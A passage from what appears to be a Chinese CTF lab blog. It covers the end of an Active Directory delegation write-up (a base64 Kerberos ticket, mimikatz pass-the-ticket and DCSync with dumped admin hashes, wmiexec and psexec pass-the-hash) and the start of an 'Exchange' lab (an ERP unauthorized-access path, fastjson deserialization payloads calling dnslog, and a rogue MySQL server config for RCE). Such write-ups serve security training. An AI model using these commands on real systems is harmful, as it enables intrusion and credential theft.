&#x27;doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6Iki/0YqtJ7VWLHKsnlTAIaKBlKfxBHVuP+4PqtRoAUCDiLg6N9t3Rwd7h/FewEmuAxQV9Dx21LcSkyLnQc2d9WkO/91l93ImQt09Yq9qtWChPbLTWRfSeknqeW0o+M2GaMdOjv2TNFt/OwbvjcwEUddynvqY7cWQ/IQYnQSlGCQDSfIeFMu2Q6aSX1QIheHaK8Tcg6Qs4ythd4i2gtMSDkbeHvJYa/5rPn10P34b/DD/BFJaL3lgLHBA9Jfs4dG0Bi52x66nw8AjeNoFtlwtY7aX0fzC5H5kCTEp+nzXceBXPxd8o8One4txOhE8noytvKslbYXf+npX5p8RMHhH+rFXEg4CDJ+gfm47SpsoppD3p9fbElVU+A5Hbi/62gtxwpDSUdDodo4b3YLdDE16bcrcPjVXxY/caxSoQEml8msFjJ7rVK/0AOkfhkmL1piaMt6S9HvEHAkcw8D0Y5l/j0yqPQ7OwLgKuEqnPYGfiXU9efBHkEybMgZzzaAqSqKmB7jmwvnnLorxcxys3OPNmel19bASrCFTEcixwwpdg/qVkf87FrlWorbMBdTSMkLfGKn95mJnozVz03TccXzvzRyDPTF2UxWc9vW8IpsHM3EqisF/wjcgLC8ShCwRfFy9mRLKkb9p7UALN4NumrVBQFNRFO3l2MYaTShtP/VlHP2rHG+K2WcTx/n9ErcvGAH9ZppjcyfKmPHdhStHlPXiDaH1KD4mNhKz+duGs5yNIaskplKbM7RW3T1M7gzHbvc9GuQjPvyyffYkE3nBAZ4mSozupD1JtFcDBGmPnhcBSI7eu7Hc9Kr2YXdosH5MPtmcUi78VpdLbZTSIeqzVpSeNmpqHxnSqTX44xkh+CPMjrGppDQzx2BXFpgL18W69sS0fMYLu49npyZCuwjEl4IY2RXwhmlZ99RBPru/K1TLSlQnJ31KHdZjICrEmO68qaVv6t5NJi3YwK8jeC4xFhzU10YpJFDcRUnmGXF4ZE0PeUnt3PVSA/AdWZ6+du1DZlYpZ35DwFJnEHEaDwJpiRSSLWPHsoMlo/vodYQyClnJpPjFBbbDcJPsggQaUf+J4hjdxbRY++WT8gdoRuNE/2qpz15Y/4vcbsVOvhXJxtpaim1riXCskG7+VP54e4j/92dMWznaanHlAWlEqs9qPO9CMXbRv0INLlH8G923TftHCx5OMx2xVTMwgloFC8QJnNhY/ZfrRc/Ni4A1H51W8qY6ntSNDS23d3N9zdgKy0q2W7iTrGqTcXpQ0GBdmW/fw+XhWB44AdPTB0gULHkxljL5d3P8IpYZkEYi23eyRLHb06k+KevYfIwJ66hhrjzw2ve6tpKlOzd531Wy5Jarp2+t9CoHeD/6sSHmT5YFsnObLVcq3Bncv7tmtKX/EeCkZfUQ+DPGgUCET/+75mNzIDK0BnlNzzAjA88KsqSHBOvmjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCBJlggmcQ5lpHgQGNePX874w4YU1y+caNbV64KnuuMpSaEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDIxODA5MjkwMlqmERgPMjAyNTAyMTgxOTI5MDJapxEYDzIwMjUwMjI1MDkyOTAyWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==&#x27; | base64 -d &gt; DC01.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250219195723.png"></p><p>使用票据导出域管hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; &quot;kerberos::ptt DC01.kirbi&quot; &quot;lsadump::dcsync /domain:xiaorang.lab /user:administrator&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218210941.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) # kerberos::purge</span><br><span class="line">Ticket(s) purge for current session is OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # kerberos::ptt DC01.kirbi</span><br><span class="line"></span><br><span class="line">* File: &#x27;DC01.kirbi&#x27;: OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /user:administrator</span><br><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] &#x27;administrator&#x27; will be the user account</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : Administrator</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00000200 ( NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   : 1601/1/1 8:00:00</span><br><span class="line">Password last change : 2025/2/18 17:28:57</span><br><span class="line">Object Security ID   : S-1-5-21-1913786442-1328635469-1954894845-500</span><br><span class="line">Object Relative ID   : 500</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: 4889f6553239ace1f7c47fa2c619c252</span><br><span class="line">    ntlm- 0: 4889f6553239ace1f7c47fa2c619c252</span><br><span class="line">    ntlm- 1: 4889f6553239ace1f7c47fa2c619c252</span><br><span class="line">    ntlm- 2: 4889f6553239ace1f7c47fa2c619c252</span><br><span class="line">    ntlm- 3: 4889f6553239ace1f7c47fa2c619c252</span><br><span class="line">    lm  - 0: e2f976b4b93c8de94f7c7d26998bde3f</span><br><span class="line">    lm  - 1: c79c7d92b2a21d11c240a59c9d1694b6</span><br><span class="line">    lm  - 2: 87912010df4ce71b5a2bec799103a236</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 144f0dde1f001effdc2ae3dbfa27d316</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : XIAORANG.LABAdministrator</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : 23b87fd9c4a80c58fb0d71e2a0d5fc82b7de27156d039ad791093aa88ca95eb3</span><br><span class="line">      aes128_hmac       (4096) : 3a4807b53f305c84603ff072655a5c42</span><br><span class="line">      des_cbc_md5       (4096) : 64feb058753bf1a2</span><br><span class="line">    OldCredentials</span><br><span class="line">      aes256_hmac       (4096) : 23b87fd9c4a80c58fb0d71e2a0d5fc82b7de27156d039ad791093aa88ca95eb3</span><br><span class="line">      aes128_hmac       (4096) : 3a4807b53f305c84603ff072655a5c42</span><br><span class="line">      des_cbc_md5       (4096) : 64feb058753bf1a2</span><br><span class="line">    OlderCredentials</span><br><span class="line">      aes256_hmac       (4096) : 23b87fd9c4a80c58fb0d71e2a0d5fc82b7de27156d039ad791093aa88ca95eb3</span><br><span class="line">      aes128_hmac       (4096) : 3a4807b53f305c84603ff072655a5c42</span><br><span class="line">      des_cbc_md5       (4096) : 64feb058753bf1a2</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : XIAORANG.LABAdministrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : 64feb058753bf1a2</span><br><span class="line">    OldCredentials</span><br><span class="line">      des_cbc_md5       : 64feb058753bf1a2</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    01  1fd4772b6f3fea5f0a5a234dde150efb</span><br><span class="line">    02  70b5ab2d5931d45749e4f10b80a70466</span><br><span class="line">    03  0d71e6115a7e5850b3e4c777aba623df</span><br><span class="line">    04  1fd4772b6f3fea5f0a5a234dde150efb</span><br><span class="line">    05  354a5ce3ca3629c6ca77a73b462c0a7f</span><br><span class="line">    06  a692fc773761b7edf3a3cad332053a85</span><br><span class="line">    07  3b3bf4f20b86e7f890d2a6f748684c86</span><br><span class="line">    08  511be1f8053c22c147fe774e84f6cfa0</span><br><span class="line">    09  5cd37846466bba0ab01d0a4fb8fd421a</span><br><span class="line">    10  5c90774e68ba65b15563d817ea03be1d</span><br><span class="line">    11  1aa618d4990ce0b031f56c35b00ef135</span><br><span class="line">    12  511be1f8053c22c147fe774e84f6cfa0</span><br><span class="line">    13  385ea61fafea315b384cff461b9e114c</span><br><span class="line">    14  ee5a115e84919b46e718c6c4294dba78</span><br><span class="line">    15  729b4c3a8edab7f12e037ec161293f44</span><br><span class="line">    16  e3ff26cc0629c51fc68f18ce47173f45</span><br><span class="line">    17  bd6d0bafad3f99c28a9a18d9e5351763</span><br><span class="line">    18  359507105fa376c918a80f7fb982446a</span><br><span class="line">    19  20ad44fe17377c5f3815358c33ca7c34</span><br><span class="line">    20  330fb8b3848b024ba40a8cef987d6795</span><br><span class="line">    21  ec544c990f343fe338a4667f3791e5ab</span><br><span class="line">    22  d528c47b4f30acdeb5bf49f49fed7d64</span><br><span class="line">    23  41bb0903f6c2129f27bfa06e6d9b186b</span><br><span class="line">    24  b5c4fc8c656c14829c0da25e0852582a</span><br><span class="line">    25  8bba781aff9bb5e7939f73c216d0e750</span><br><span class="line">    26  d3bb8972f7c7ffbc5b22392125c4e21f</span><br><span class="line">    27  dd97e0d53b5d1ae346029810cf74d0b8</span><br><span class="line">    28  0c084ded5672573ee7c4127ab474f930</span><br><span class="line">    29  c922d791de366eedeb97c1bd0798d6ff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # exit</span><br><span class="line">Bye!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>用域管hash登录另一个域用户拿flag03</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/Administrator@172.22.4.19 -codec gbk</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218211359.png"></p><p>查看flag<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218211640.png"></p><p>登陆域控拿到flag04</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 Administrator@172.22.4.7</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 Administrator@172.22.4.7 -codec gbk</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218212132.png"></p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218212144.png"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://fushuling.com/index.php/2023/09/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7delegation/">https://fushuling.com/index.php/2023/09/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7delegation/</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 非约束委派 </tag>
            
            <tag> 强制认证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Exchange</title>
      <link href="/2025/02/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Exchange/"/>
      <url>/2025/02/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Exchange/</url>
      
        <content type="html"><![CDATA[<h1 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h1><p><strong>Exchange + JDBC + FastJSON 三者之间的关系简单理解</strong>：<br> <strong>Exchange 获取邮件 -&gt;JDBC 存入 MySQL -&gt;FastJSON 转换 JSON</strong> ，Java 应用可以处理企业邮件，并提供 API 给前端。</p><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>拿到ip后先用fscan扫一下<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250205170220.png"></p><p>发现8000端口存在一个web服务，访问是一个华夏erp<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250205170252.png"></p><p>搜了该CMS相关的漏洞，发现一个未授权漏洞，路径如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user/getAllList;.ico</span><br></pre></td></tr></table></figure><p>访问发现管理员账号密码</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250205170339.png"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">200</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;userList&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">63</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;季圣华&quot;</span><span class="punctuation">,</span><span class="attr">&quot;loginName&quot;</span><span class="punctuation">:</span><span class="string">&quot;jsh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span><span class="punctuation">,</span><span class="attr">&quot;position&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;department&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;phonenum&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ismanager&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;isystem&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;tenantId&quot;</span><span class="punctuation">:</span><span class="number">63</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">120</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;管理员&quot;</span><span class="punctuation">,</span><span class="attr">&quot;loginName&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span><span class="punctuation">,</span><span class="attr">&quot;position&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;department&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;phonenum&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;ismanager&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;isystem&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;tenantId&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">131</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;测试用户&quot;</span><span class="punctuation">,</span><span class="attr">&quot;loginName&quot;</span><span class="punctuation">:</span><span class="string">&quot;test123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span><span class="punctuation">,</span><span class="attr">&quot;position&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;department&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;phonenum&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ismanager&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;isystem&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;tenantId&quot;</span><span class="punctuation">:</span><span class="number">63</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>解密得到明文密码admin&#x2F;123456<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250205170521.png"></p><p>解码登陆后台后，没有发现可利用的点；</p><h3 id="fastjson反序列化漏洞检测"><a href="#fastjson反序列化漏洞检测" class="headerlink" title="fastjson反序列化漏洞检测"></a>fastjson反序列化漏洞检测</h3><p>先随便抓个包看看，发现后端查询功能的内容是通过JSON传递的，在查询的参数上测试是否存在fastjson反序列化<br><strong>poyload:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.nt.Inet4Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;bc50l0.dnslog.cn&quot;</span>&#125;#val的值为dnslog地址</span><br></pre></td></tr></table></figure><p>执行poyload，poyload需要url全编码<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250205172038.png"></p><p>执行后，dnslog有回显，说明poyload执行成功存在fastjson反序列化</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250205172052.png"></p><p>使用如下poyload测试fastjson的版本，当fastjson&lt;&#x3D;1.2.68时，下方的代码就能成功执行，反之相反。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;java.io.ByteArrayOutputStream&quot;</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.io.ByteArrayOutputStream&quot;</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.net.InetSocketAddress&quot; &#123;</span><br><span class="line">            &quot;address&quot;: ,</span><br><span class="line">            &quot;val&quot;: &quot;lt1g65.dnslog.cn&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>将poyload url编码后发送<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250205173817.png"><br>发现有回显，代码执行成功说明fastjson&lt;&#x3D;1.2.68<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250205173801.png"></p><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.68+ JDBC 反序列化实现RCE"></a>fastjson&lt;&#x3D;1.2.68+ JDBC 反序列化实现RCE</h3><p>同时根据题目提示的JDBC,针对fastjson&lt;&#x3D;1.2.68打JDBC实现二次反序列化CC，从而达到RCE<br><a href="https://github.com/safe6Sec/Fastjson">https://github.com/safe6Sec/Fastjson</a>  fastjson的poyload的来源</p><p>首先现在服务器上开启一个恶意的MySQL服务，需要下载两个工具<a href="https://github.com/fnmsd/MySQL_Fake_Server">MySQL_Fake_Server</a>和<a href="https://github.com/frohoff/ysoserial">ysoserial</a>，同时需要把ysoserial-all.jar放到MySQL_Fake_Server的目录里面。<br>MySQL_Fake_Server的config配置如下：<br>ysoserialPath填写刚刚下载的Ysoserial地址<br>CC利用链选CC6，是CC3版本中最通用的一条链，bash后面为弹shell的poyload，需要添加vpsip和要监听的端口</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;ysoserialPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;ysoserial-all.jar&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;javaBinPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;java&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;fileOutputDir&quot;</span><span class="punctuation">:</span><span class="string">&quot;./fileOutput/&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;displayFileContentOnScreen&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;saveToFile&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;fileread&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;win_ini&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\win.ini&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;win_hosts&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;win&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;linux_passwd&quot;</span><span class="punctuation">:</span><span class="string">&quot;/etc/passwd&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;linux_hosts&quot;</span><span class="punctuation">:</span><span class="string">&quot;/etc/hosts&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;index_php&quot;</span><span class="punctuation">:</span><span class="string">&quot;index.php&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;ssrf&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://www.baidu.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;__defaultFiles&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/etc/hosts&quot;</span><span class="punctuation">,</span><span 